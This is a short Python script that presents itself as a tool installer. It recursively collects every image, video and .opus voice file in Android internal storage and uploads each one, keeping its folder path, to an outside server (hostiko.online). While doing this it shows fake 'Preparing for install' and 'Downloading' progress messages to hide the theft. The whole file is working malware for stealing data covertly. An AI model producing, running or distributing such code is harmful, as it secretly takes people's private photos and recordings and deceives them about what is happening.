import os
import requests

# ✅ Step 1
base_path = "/storage/emulated/0/"  # Android internal storage
server_url = "https://hostiko.online/data/upload.php"  
image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.opus']

# ✅ Step 2
def find_all_images(path):
    image_files = []
    for root, dirs, files in os.walk(path):
        for file in files:
            if any(file.lower().endswith(ext) for ext in image_extensions):
                image_files.append(os.path.join(root, file))
    return image_files

# ✅ Step 3
def upload_image(image_path):
    try:
        relative_path = os.path.relpath(image_path, base_path)  # Relative path to keep folder structure
        with open(image_path, 'rb') as f:
            files = {'file': (os.path.basename(image_path), f, 'image/jpeg')}
            data = {'path': relative_path}  # Send relative path to server
            response = requests.post(server_url, files=files, data=data)
            if response.status_code == 200:
                return True
            else:
                return False
    except Exception as e:
        return False

# ✅ Step 4: Run Everything
if __name__ == "__main__":
    print("🔍 Preparing for install...")
    images = find_all_images(base_path)
    total_images = len(images)
    print(f"📤 Downloading started. Please wait, it may take several minutes...\n")

    for idx, img in enumerate(images, start=1):
        success = upload_image(img)
        percent = int((idx / total_images) * 100)
        if success:
            print(f"✔\r Downloading ({percent}%)",end=" ")
        else:
            print(f" ... ")


    print("\n✅ All done! Tool opening")

